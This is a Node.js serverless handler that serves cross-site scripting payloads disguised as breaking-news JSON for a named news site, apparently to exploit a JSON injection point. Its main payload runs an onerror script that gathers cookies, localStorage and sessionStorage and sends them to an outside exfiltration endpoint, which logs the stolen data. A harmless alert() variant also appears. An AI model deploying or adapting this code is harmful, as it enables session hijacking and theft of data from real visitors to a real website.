// Vercel serverless: serves exfiltration payload with CORS at /
// Routes: / → exfil payload, /alert → original alert payload, /exfil → receive stolen data, /loot → view loot

const BASE_URL = process.env.BASE_URL || 'https://xss-cors-payload.onrender.com';

const xssScript = `(function(){var e='${BASE_URL}/exfil';var d={domain:document.domain,url:location.href,cookie:document.cookie,localStorage:{},sessionStorage:{}};try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);d.localStorage[k]=localStorage.getItem(k);}}catch(x){}try{for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);d.sessionStorage[k2]=sessionStorage.getItem(k2);}}catch(x){}fetch(e,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(d)});new Image().src=e+'?c='+encodeURIComponent(document.cookie).slice(0,2000);})();`;

const exfilPayload = {
  data: {
    results: [{
      publication_date: '2026-03-03T12:00:00Z',
      'main-content': [{
        component: 'BreakingNews',
        model: {
          url: 'https://www.foxbusiness.com/markets',
          headline: `BREAKING NEWS <img src=x onerror="${xssScript}">`,
          bannerType: 'BreakingNews'
        }
      }]
    }]
  }
};

const alertPayload = {
  data: {
    results: [{
      publication_date: '2026-03-03T12:00:00Z',
      'main-content': [{
        component: 'BreakingNews',
        model: {
          url: 'https://www.foxbusiness.com/markets',
          headline: 'SECURITY TEST <img src=x onerror=alert(document.domain)>',
          bannerType: 'BreakingNews'
        }
      }]
    }]
  }
};

module.exports = (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    res.status(204).end();
    return;
  }
  const p = req.url.split('?')[0];
  if (p === '/alert') {
    return res.status(200).json(alertPayload);
  }
  if (p === '/exfil') {
    if (req.method === 'POST') {
      console.log('EXFIL POST:', JSON.stringify(req.body));
    } else {
      console.log('EXFIL GET:', req.query);
    }
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    return res.status(200).end(gif);
  }
  res.status(200).json(exfilPayload);
};
